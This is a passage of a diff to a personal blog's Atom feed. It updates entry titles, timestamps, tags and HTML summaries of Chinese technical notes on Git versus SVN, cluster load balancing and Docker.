+      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
     
     </summary>
     
@@ -903,39 +410,17 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 面向对象思想</title>
-    <link href="https://sometwo7.github.io/blog/post/7a9a193e.html"/>
-    <id>https://sometwo7.github.io/blog/post/7a9a193e.html</id>
+    <title>网络技术 - 集群</title>
+    <link href="https://sometwo7.github.io/blog/post/78b8663.html"/>
+    <id>https://sometwo7.github.io/blog/post/78b8663.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.316Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一三大特性&quot;&gt;一、三大特性&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#封装&quot;&gt;封装&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#继承&quot;&gt;继承&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#多态&quot;&gt;多态&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二类图&quot;&gt;二、类图&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#泛化关系-generalization&quot;&gt;泛化关系 (Generalization)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#实现关系-realization&quot;&gt;实现关系 (Realization)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#聚合关系-aggregation&quot;&gt;聚合关系 (Aggregation)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#组合关系-composition&quot;&gt;组合关系 (Composition)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#关联关系-association&quot;&gt;关联关系 (Association)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#依赖关系-dependency&quot;&gt;依赖关系 (Dependency)&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三设计原则&quot;&gt;三、设计原则&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#solid&quot;&gt;S.O.L.I.D&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#其他常见原则&quot;&gt;其他常见原则&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
+      &lt;h1 id=&quot;一、负载均衡&quot;&gt;&lt;a href=&quot;#一、负载均衡&quot; class=&quot;headerlink&quot; title=&quot;一、负载均衡&quot;&gt;&lt;/a&gt;一、负载均衡&lt;/h1&gt;&lt;p&gt;集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。&lt;/p&gt;&lt;p&gt;负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。&lt;/p&gt;&lt;p&gt;负载均衡器可以用来实现高可用以及伸缩性：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；&lt;/li&gt;
+&lt;li&gt;伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。&lt;/li&gt;
 &lt;/ul&gt;
     
     </summary>
@@ -944,7 +429,7 @@
       <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
     
     
-      <category term="对象" scheme="https://sometwo7.github.io/blog/tags/%E5%AF%B9%E8%B1%A1/"/>
+      <category term="集群" scheme="https://sometwo7.github.io/blog/tags/%E9%9B%86%E7%BE%A4/"/>
     
   </entry>
   
@@ -953,21 +438,11 @@
     <link href="https://sometwo7.github.io/blog/post/1b4f4a15.html"/>
     <id>https://sometwo7.github.io/blog/post/1b4f4a15.html</id>
     <published>2019-11-05T10:01:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一解决的问题&quot;&gt;一、解决的问题&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二与虚拟机的比较&quot;&gt;二、与虚拟机的比较&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三优势&quot;&gt;三、优势&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四使用场景&quot;&gt;四、使用场景&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五镜像与容器&quot;&gt;五、镜像与容器&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、解决的问题&quot;&gt;&lt;a href=&quot;#一、解决的问题&quot; class=&quot;headerlink&quot; title=&quot;一、解决的问题&quot;&gt;&lt;/a&gt;一、解决的问题&lt;/h1&gt;&lt;p&gt;由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。&lt;/p&gt;&lt;p&gt;Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。&lt;/p&gt;
+      &lt;h1 id=&quot;一、解决的问题&quot;&gt;&lt;a href=&quot;#一、解决的问题&quot; class=&quot;headerlink&quot; title=&quot;一、解决的问题&quot;&gt;&lt;/a&gt;一、解决的问题&lt;/h1&gt;&lt;p&gt;由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。&lt;/p&gt;&lt;p&gt;Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。&lt;/p&gt;
     
     </summary>
     
@@ -984,7 +459,7 @@
     <link href="https://sometwo7.github.io/blog/post/3c20f5a2.html"/>
     <id>https://sometwo7.github.io/blog/post/3c20f5a2.html</id>
     <published>2019-11-01T18:11:11.000Z</published>
-    <updated>2019-11-05T13:02:39.944Z</updated>
+    <updated>2019-11-12T06:21:18.308Z</updated>
     
     <summary type="html">
     
